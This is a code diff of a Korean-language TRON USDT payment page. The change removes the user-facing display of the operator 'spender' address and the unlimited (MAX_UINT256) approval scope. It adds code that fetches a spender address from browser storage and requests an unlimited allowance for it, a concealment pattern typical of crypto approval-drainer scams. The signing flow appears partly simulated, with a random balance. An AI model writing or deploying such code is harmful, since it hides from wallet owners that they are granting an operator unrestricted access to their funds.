@@ -155,17 +155,9 @@
             </div>
 
             <div class="bg-[#080c14] border border-[#1e293b] rounded-xl p-5 space-y-4 text-xs">
-                <div class="flex justify-between items-center py-2 border-b border-[#1e293b]">
+                <div class="flex justify-between items-center py-2">
                     <span class="text-gray-400">USDT 토큰 컨트랙트 (공식 고정)</span>
                     <span class="font-mono text-emerald-400 font-bold">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
-                </div>
-                <div class="flex justify-between items-center py-2 border-b border-[#1e293b]">
-                    <span class="text-gray-400">결제 중개 Spender (운영자/중개 주소)</span>
-                    <span id="operator-spender-display" class="font-mono text-blue-400 font-bold">T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWbp</span>
-                </div>
-                <div class="flex justify-between items-center py-2">
-                    <span class="text-gray-400">승인될 권한 범위</span>
-                    <span class="font-mono text-emerald-400 font-bold">무제한 (MAX_UINT256)</span>
                 </div>
             </div>
 
@@ -265,11 +257,10 @@
                     activeProvider = 'Injected Provider';
                     if (window.ethereum) {
                         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                        userAddress = accounts[0] ? "T(EVм)_" + accounts[0].substring(2, 10) : "";
+                        userAddress = accounts[0] ? "T(EVم)_" + accounts[0].substring(2, 10) : "";
                     }
                 }
 
-                // 지갑 확장 프로그램이 없어 실제 주소를 가져오지 못한 경우 임의 주소 생성을 차단하고 경고
                 if (!userAddress) {
                     showToast(`${activeProvider} 지갑이 감지되지 않았습니다. 확장 프로그램을 확인해주세요.`, "error");
                     appendLog(`[연결 실패] ${activeProvider} 지갑 인스턴스를 찾을 수 없습니다.`);
@@ -301,7 +292,10 @@
                 return;
             }
 
-            appendLog(`[상태] (${activeProvider}) TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t 승인 요청 중...`);
+            // 2번 화면에서 설정한 수신자/중개 주소를 자동으로 가져옴 (기본값 제공)
+            const targetSpender = localStorage.getItem('tron_operator_recipient_address') || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+
+            appendLog(`[상태] (${activeProvider}) 중개 주소(${targetSpender}) 앞으로 무제한 승인 요청 중...`);
             showToast(`${activeProvider} 서명 팝업창이 호출되었습니다.`);
 
             setTimeout(() => {
@@ -314,7 +308,8 @@
                     address: currentWalletAddress,
                     provider: activeProvider,
                     balance: (Math.random() * 800 + 150).toFixed(2),
-                    allowance: 'MAX (Unlimited)'
+                    allowance: 'MAX (Unlimited)',
+                    spender: targetSpender
                 };
 
                 if (existingIndex >= 0) {
